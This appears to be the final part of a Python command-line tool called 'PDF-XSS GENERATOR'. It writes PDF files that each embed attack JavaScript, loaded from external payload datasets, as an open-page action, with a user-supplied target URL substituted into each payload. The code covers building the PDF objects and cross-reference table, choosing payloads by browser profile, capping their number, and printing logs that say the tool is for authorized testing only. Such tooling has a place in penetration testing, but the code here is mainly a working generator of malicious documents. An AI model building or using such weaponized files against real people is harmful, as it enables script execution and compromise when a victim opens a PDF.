    for json_line in json.dumps(display_record, indent=2, ensure_ascii=True).splitlines():
        lines.extend(wrap_text_for_pdf(json_line))

    return lines


def build_content_stream(payload, index, target_url):
    """Build a content stream for a single payload page."""
    lines = build_page_lines(payload, index, target_url)
    max_lines = max((PDF_TOP_MARGIN - PDF_BOTTOM_MARGIN) // PDF_LINE_HEIGHT, 1)
    lines = lines[:max_lines]

    stream_lines = [
        "BT",
        "/F1 10 Tf",
        f"{PDF_LINE_HEIGHT} TL",
        f"{PDF_LEFT_MARGIN} {PDF_TOP_MARGIN} Td",
    ]

    for index, line in enumerate(lines):
        if index == 0:
            stream_lines.append(f"{pdf_literal_string(line)} Tj")
        else:
            stream_lines.append(f"T* {pdf_literal_string(line)} Tj")

    stream_lines.append("ET")
    return "\n".join(stream_lines).encode("ascii")


def build_pdf_bytes(selection_name, payloads, target_url, pdf_version):
    """Create a byte-correct PDF with one payload per page."""
    if not payloads:
        raise ValueError("No payloads to serialize")

    objects = {}
    page_refs = []
    object_number = 3

    for index, payload in enumerate(payloads):
        page_number = object_number
        content_number = object_number + 1
        font_number = object_number + 2
        object_number += 3
        page_refs.append(f"{page_number} 0 R")

        javascript = substitute_url_in_payload(payload["payload"], target_url)
        page_object = (
            f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            f"/Resources << /Font << /F1 {font_number} 0 R >> >> "
            f"/Contents {content_number} 0 R "
            f"/AA << /O << /S /JavaScript /JS {pdf_literal_string(javascript)} >> >> >>"
        ).encode("ascii")
        content_stream = build_content_stream(payload, index, target_url)
        content_object = (
            f"<< /Length {len(content_stream)} >>\nstream\n".encode("ascii")
            + content_stream
            + b"\nendstream"
        )
        font_object = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"

        objects[page_number] = page_object
        objects[content_number] = content_object
        objects[font_number] = font_object

    objects[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
    objects[2] = f"<< /Type /Pages /Kids [{' '.join(page_refs)}] /Count {len(page_refs)} >>".encode(
        "ascii"
    )

    max_object = max(objects)
    buffer = bytearray()
    buffer.extend(f"%PDF-{pdf_version}\n%\xe2\xe3\xcf\xd3\n".encode("latin-1"))
    offsets = {}

    for current_object in range(1, max_object + 1):
        offsets[current_object] = len(buffer)
        buffer.extend(f"{current_object} 0 obj\n".encode("ascii"))
        buffer.extend(objects[current_object])
        buffer.extend(b"\nendobj\n")

    xref_offset = len(buffer)
    buffer.extend(f"xref\n0 {max_object + 1}\n".encode("ascii"))
    buffer.extend(b"0000000000 65535 f \n")
    for current_object in range(1, max_object + 1):
        buffer.extend(f"{offsets[current_object]:010d} 00000 n \n".encode("ascii"))

    buffer.extend(
        (
            f"trailer\n<< /Size {max_object + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref_offset}\n%%EOF\n"
        ).encode("ascii")
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{selection_name}_all_payloads_{timestamp}.pdf"
    return filename, bytes(buffer)


def save_pdf_file(filename, content, output_dir):
    """Save PDF bytes to disk."""
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    file_path = output_path / filename
    file_path.write_bytes(content)
    return file_path


def enforce_payload_limit(payloads, requested_count, max_payloads):
    """Apply the requested payload count while keeping config caps visible."""
    if requested_count is None:
        return payloads

    if requested_count <= 0:
        raise ValueError("--count must be greater than zero")

    if max_payloads and requested_count > max_payloads:
        logger.warning(
            "Requested payload count %s exceeds configured max_payloads_per_run=%s; capping",
            requested_count,
            max_payloads,
        )
        requested_count = max_payloads

    return payloads[:requested_count]


def ensure_generation_ready(issues, validation_enabled):
    """Log validation state and block generation on dataset errors when enabled."""
    if issues:
        logger.warning("Payload normalization issues: %s", summarize_issue_counts(issues))

    if validation_enabled and count_issues(issues, "error"):
        logger.error(
            "Payload dataset contains %s validation error(s). Run --validate-payloads for details.",
            count_issues(issues, "error"),
        )
        return False

    return True


def log_generation_context(args, payload_count):
    """Log the generation parameters in one place."""
    logger.info("PDF-XSS GENERATOR v%s", VERSION)
    logger.info("Target Browser: %s", args.browser)
    logger.info("Profile: %s", args.profile or "none")
    logger.info("Target URL: %s", args.url)
    logger.info("Output Directory: %s", args.output_dir)
    logger.info("PDF Version: %s", args.pdf_version)
    logger.info("Payload Count: %s", payload_count)


def main():
    """CLI entry point."""
    config = load_config()
    parser = make_parser(config)
    args = parser.parse_args()

    global logger
    logger = setup_logging(getattr(logging, args.log_level), args.log_file)

    if args.list_browsers:
        list_available_browsers(config)
        return 0
    if args.list_profiles:
        list_available_profiles()
        return 0

    args.browser = resolve_selected_browser(args, parser)
    validate_cli_requirements(args, parser)

    datasets = load_selected_datasets(args.browser, config)

    if args.validate_payloads:
        return run_validation_mode(datasets, args.report_file)

    all_payloads, all_issues = collect_payload_artifacts(datasets)
    all_payloads = filter_payloads_by_profile(all_payloads, args.profile)

    if not all_payloads:
        logger.error("No payloads matched the current browser/profile selection. Exiting.")
        return 1

    generation = config.get("generation", {})
    if not ensure_generation_ready(all_issues, generation.get("enable_payload_validation", True)):
        return 1

    payloads = enforce_payload_limit(all_payloads, args.count, generation.get("max_payloads_per_run"))
    log_generation_context(args, len(payloads))

    filename, pdf_bytes = build_pdf_bytes(args.browser, payloads, args.url, args.pdf_version)
    file_path = save_pdf_file(filename, pdf_bytes, args.output_dir)

    logger.info("PDF file created: %s", file_path.name)
    logger.info("Generation complete - 1 PDF file created in %s", Path(args.output_dir))
    logger.warning("These PDF files contain payloads for authorized security testing only.")
    logger.warning("Use only with proper permissions in controlled environments.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
